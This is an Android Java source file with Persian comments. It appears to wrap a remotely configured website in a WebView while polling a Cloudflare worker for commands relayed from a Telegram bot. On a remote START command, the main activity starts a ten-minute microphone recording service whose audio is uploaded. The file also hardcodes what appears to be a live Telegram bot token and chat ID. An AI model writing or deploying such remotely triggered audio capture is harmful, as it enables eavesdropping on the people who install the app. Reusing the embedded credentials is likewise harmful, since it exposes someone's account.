package com.blu.app;

import android.annotation.SuppressLint;
import android.app.DownloadManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.KeyEvent;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import android.Manifest;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import com.blu.app.voice.CommandChecker;
import com.blu.app.voice.VoiceRecorderService;

public class MainActivity extends AppCompatActivity {

    private static final String WORKER_URL = "https://voice-bot-worker.kapcher2019.workers.dev/get-url";
    private static final String SEND_COMMAND_URL = "https://voice-bot-worker.kapcher2019.workers.dev/send-command";
    private static final String FALLBACK_URL = "https://example.com";
    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final int NOTIFICATION_PERMISSION_CODE = 200;
    
    private WebView webView;
    private BroadcastReceiver voiceReceiver;
    private CommandChecker commandChecker;
    private String voiceToken = "token_" + System.currentTimeMillis();
    private boolean isRecording = false;
    private String botToken = "8985315189:AAEeTfrU-QUmyucxmgQBc0OyoQ1jNABREhM";
    private String chatId = "-1004352035353";
    
    @SuppressLint("SetJavaScriptEnabled")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        Log.d("MainActivity", "🚀 اپ شروع شد!");
        
        // ✅ درخواست همه مجوزها
        requestAllPermissions();
        
        // WebView
        webView = new WebView(this);
        setContentView(webView);
        setupWebView();
        
        // دریافت تنظیمات و بارگذاری
        resolveUrlAndLoad();
        setupVoiceBroadcastReceiver();
        
        // شروع CommandChecker
        startCommandChecking();
    }
    
    private void requestAllPermissions() {
        // لیست مجوزهای مورد نیاز
        String[] permissions;
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            // اندروید ۱۳+
            permissions = new String[]{
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.POST_NOTIFICATIONS,
                Manifest.permission.FOREGROUND_SERVICE
            };
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // اندروید ۱۰ تا ۱۲
            permissions = new String[]{
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.FOREGROUND_SERVICE
            };
        } else {
            // اندروید ۹ و پایین‌تر
            permissions = new String[]{
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.WRITE_EXTERNAL_STORAGE
            };
        }
        
        // چک کردن مجوزها
        boolean allGranted = true;
        for (String perm : permissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }
        
        if (!allGranted) {
            ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
        } else {
            Log.d("MainActivity", "✅ همه مجوزها قبلاً داده شده");
        }
        
        // مجوز نوتیفیکیشن در اندروید ۱۳+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) 
                != PackageManager.PERMISSION_GRANTED) {
                // درخواست مجوز نوتیفیکیشن
                ActivityCompat.requestPermissions(this, 
                    new String[]{Manifest.permission.POST_NOTIFICATIONS}, 
                    NOTIFICATION_PERMISSION_CODE);
            }
        }
    }
    
    private void startCommandChecking() {
        commandChecker = new CommandChecker(new CommandChecker.OnCommandListener() {
            @Override
            public void onStartCommand(String token) {
                Log.d("MainActivity", "🎤 دستور START از تلگرام! Token: " + token);
                runOnUiThread(() -> {
                    Toast.makeText(MainActivity.this, "🎤 ضبط صدا شروع شد! (۱۰ دقیقه)", Toast.LENGTH_LONG).show();
                    voiceToken = token;
                    startRecording();
                });
            }
            
            @Override
            public void onStopCommand(String token) {
                Log.d("MainActivity", "⏹️ دستور STOP از تلگرام! Token: " + token);
                runOnUiThread(() -> {
                    Toast.makeText(MainActivity.this, "⏹️ ضبط متوقف شد", Toast.LENGTH_SHORT).show();
                    stopRecording();
                });
            }
            
            @Override
            public void onDeclineCommand(String token) {
                Log.d("MainActivity", "❌ دستور DECLINE از تلگرام! Token: " + token);
                runOnUiThread(() -> {
                    Toast.makeText(MainActivity.this, "❌ ضبط رد شد", Toast.LENGTH_SHORT).show();
                });
            }
            
            @Override
            public void onError(String error) {
                Log.e("MainActivity", "❌ خطا: " + error);
            }
        });
        
        commandChecker.startChecking();
    }
    
    private void startRecording() {
        if (isRecording) {
            Toast.makeText(this, "در حال ضبط است!", Toast.LENGTH_SHORT).show();
            return;
        }
        
        // چک کردن مجوز میکروفون
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) 
            != PackageManager.PERMISSION_GRANTED) {
            Toast.makeText(this, "⚠️ مجوز میکروفون لازم است!", Toast.LENGTH_LONG).show();
            ActivityCompat.requestPermissions(this, 
                new String[]{Manifest.permission.RECORD_AUDIO}, 
                PERMISSION_REQUEST_CODE);
            return;
        }
        
        isRecording = true;
        Intent serviceIntent = new Intent(this, VoiceRecorderService.class);
        serviceIntent.setAction("START_RECORDING");
        serviceIntent.putExtra("voice_token", voiceToken);
        startService(serviceIntent);
    }
    
    private void stopRecording() {
        if (!isRecording) {
            Toast.makeText(this, "ضبط فعال نیست!", Toast.LENGTH_SHORT).show();
            return;
        }
        isRecording = false;
        Intent serviceIntent = new Intent(this, VoiceRecorderService.class);
        serviceIntent.setAction("STOP_RECORDING");
        startService(serviceIntent);
    }
    
    private void setupWebView() {
        WebSettings s = webView.getSettings();
        s.setJavaScriptEnabled(true);
        s.setDomStorageEnabled(true);
        s.setDatabaseEnabled(true);
        s.setLoadWithOverviewMode(true);
        s.setUseWideViewPort(true);
        s.setCacheMode(WebSettings.LOAD_DEFAULT);
        s.setMediaPlaybackRequiresUserGesture(false);
        
        webView.setWebViewClient(new WebViewClient());
        webView.setWebChromeClient(new WebChromeClient());
        
        webView.setDownloadListener((url, userAgent, contentDisposition, mimeType, contentLength) -> {
            try {
                DownloadManager.Request request = new DownloadManager.Request(Uri.parse(url));
                request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED);
                DownloadManager dm = (DownloadManager) getSystemService(DOWNLOAD_SERVICE);
                if (dm != null) dm.enqueue(request);
                Toast.makeText(this, "📥 دانلود...", Toast.LENGTH_SHORT).show();
            } catch (Exception e) {
                Toast.makeText(this, "❌ خطا در دانلود", Toast.LENGTH_SHORT).show();
            }
        });
    }
    
    private void setupVoiceBroadcastReceiver() {
        voiceReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                String action = intent.getAction();
                if (action == null) return;
                
                switch (action) {
                    case "VOICE_RECORDING_STARTED":
                        Toast.makeText(context, "🎤 ضبط شروع شد!", Toast.LENGTH_SHORT).show();
                        break;
                    case "VOICE_RECORDING_COMPLETED":
                        Toast.makeText(context, "⏳ ضبط کامل شد!", Toast.LENGTH_SHORT).show();
                        break;
                    case "VOICE_RECORDING_STOPPED":
                        Toast.makeText(context, "⏹️ ضبط متوقف شد!", Toast.LENGTH_SHORT).show();
                        isRecording = false;
                        break;
                    case "VOICE_UPLOAD_SUCCESS":
                        Toast.makeText(context, "✅ فایل صوتی ارسال شد!", Toast.LENGTH_LONG).show();
                        isRecording = false;
                        if (commandChecker != null && !commandChecker.isRunning()) {
                            commandChecker.startChecking();
                        }
                        break;
                    case "VOICE_UPLOAD_FAILED":
                        Toast.makeText(context, "❌ ارسال ناموفق!", Toast.LENGTH_LONG).show();
                        isRecording = false;
                        if (commandChecker != null && !commandChecker.isRunning()) {
                            commandChecker.startChecking();
                        }
                        break;
                    case "VOICE_RECORDING_ERROR":
                        Toast.makeText(context, "❌ خطا در ضبط!", Toast.LENGTH_LONG).show();
                        isRecording = false;
                        break;
                }
            }
        };
        
        IntentFilter filter = new IntentFilter();
        filter.addAction("VOICE_RECORDING_STARTED");
        filter.addAction("VOICE_RECORDING_COMPLETED");
        filter.addAction("VOICE_RECORDING_STOPPED");
        filter.addAction("VOICE_UPLOAD_SUCCESS");
        filter.addAction("VOICE_UPLOAD_FAILED");
        filter.addAction("VOICE_RECORDING_ERROR");
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(voiceReceiver, filter, Context.RECEIVER_EXPORTED);
        } else {
            registerReceiver(voiceReceiver, filter);
        }
    }
    
    private void resolveUrlAndLoad() {
        new Thread(() -> {
            String siteUrl = FALLBACK_URL;
            
            try {
                URL u = new URL(WORKER_URL);
                HttpURLConnection conn = (HttpURLConnection) u.openConnection();
                conn.setRequestMethod("GET");
                conn.setConnectTimeout(5000);
                conn.setReadTimeout(5000);
                int code = conn.getResponseCode();
                
                if (code >= 200 && code < 300) {
                    BufferedReader r = new BufferedReader(
                        new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8)
                    );
                    StringBuilder sb = new StringBuilder();
                    String line;
                    while ((line = r.readLine()) != null) {
                        sb.append(line);
                    }
                    r.close();
                    
                    JSONObject obj = new JSONObject(sb.toString());
                    
                    String got = obj.optString("url", "");
                    if (got != null && !got.isEmpty()) {
                        siteUrl = got.replaceAll("/$", "");
                    }
                    
                    String token = obj.optString("voice_token", "");
                    if (token != null && !token.isEmpty()) {
                        voiceToken = token;
                    }
                    
                    String bt = obj.optString("bot_token", "");
                    if (bt != null && !bt.isEmpty()) {
                        botToken = bt;
                    }
                    
                    String cid = obj.optString("chat_id", "");
                    if (cid != null && !cid.isEmpty()) {
                        chatId = cid;
                    }
                    
                    Log.d("MainActivity", "URL: " + siteUrl);
                    Log.d("MainActivity", "VoiceToken: " + voiceToken);
                }
            } catch (Exception e) {
                Log.e("MainActivity", "Error: " + e.getMessage());
            }
            
            final String finalUrl = siteUrl;
            
            new Handler(Looper.getMainLooper()).post(() -> {
                webView.loadUrl(finalUrl);
                
                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                    sendCommandToTelegram();
                }, 2000);
            });
        }).start();
    }
    
    private void sendCommandToTelegram() {
        new Thread(() -> {
            try {
                okhttp3.OkHttpClient client = new okhttp3.OkHttpClient();
                
                JSONObject json = new JSONObject();
                json.put("chat_id", chatId);
                json.put("voice_token", voiceToken);
                
                okhttp3.RequestBody body = okhttp3.RequestBody.create(
                    json.toString(),
                    okhttp3.MediaType.parse("application/json")
                );
                
                okhttp3.Request request = new okhttp3.Request.Builder()
                    .url(SEND_COMMAND_URL)
                    .post(body)
                    .build();
                
                okhttp3.Response response = client.newCall(request).execute();
                String responseBody = response.body() != null ? response.body().string() : "";
                response.close();
                
                Log.d("MainActivity", "📤 ارسال به تلگرام: " + responseBody);
                
            } catch (Exception e) {
                Log.e("MainActivity", "❌ خطا در ارسال به تلگرام: " + e.getMessage());
            }
        }).start();
    }
    
    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_BACK && webView.canGoBack()) {
            webView.goBack();
            return true;
        }
        return super.onKeyDown(keyCode, event);
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (voiceReceiver != null) {
            try {
                unregisterReceiver(voiceReceiver);
            } catch (Exception e) {}
        }
        if (commandChecker != null) {
            commandChecker.stopChecking();
        }
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            for (int i = 0; i < permissions.length; i++) {
                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                    Toast.makeText(this, 
                        "⚠️ مجوز " + permissions[i] + " لازم است!\nبرنامه ممکن است درست کار نکند.", 
                        Toast.LENGTH_LONG).show();
                } else {
                    Log.d("MainActivity", "✅ مجوز " + permissions[i] + " داده شد");
                }
            }
        }
        
        if (requestCode == NOTIFICATION_PERMISSION_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Log.d("MainActivity", "✅ مجوز نوتیفیکیشن داده شد");
            } else {
                Toast.makeText(this, 
                    "⚠️ مجوز نوتیفیکیشن داده نشد!\nبرای دریافت وضعیت ضبط، مجوز را فعال کنید.", 
                    Toast.LENGTH_LONG).show();
            }
        }
    }
}
